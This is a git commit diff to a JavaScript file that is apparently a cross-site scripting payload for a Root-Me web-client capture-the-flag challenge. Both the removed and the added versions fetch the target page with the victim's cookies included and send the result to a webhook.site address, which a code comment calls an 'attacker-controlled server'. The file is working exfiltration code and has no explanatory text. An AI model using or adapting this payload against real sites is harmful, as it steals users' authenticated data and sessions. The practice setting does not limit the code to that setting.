3ec35583d1f3ff68e45efaf7ca90a43340c30675
tristanqtn <tristan.querton@gmail.com>
2025-02-02 16:02:01 +0100

    aaa

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,19 +1,20 @@
 // color.js
 (function () {
   alert("XSS Triggered!");
-  fetch("https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=", {
-    method: "GET",
+  fetch("http://challenge01.root-me.org/web-client/ch62/", {
     credentials: "include", // Include cookies in the request
-  }).then((response) => {
-    response.text().then((data) => {
-      // Send the response back to your server
-      fetch(
-        "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=",
-        {
-          method: "POST",
-          body: data,
-        }
-      );
-    });
-  });
+    method: "GET",
+  })
+    .then((response) => response.text())
+    .then((data) => {
+      // Send the server's response to the attacker-controlled server
+      fetch("	https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ response: data }),
+      });
+    })
+    .catch((err) => console.error(err));
 })();
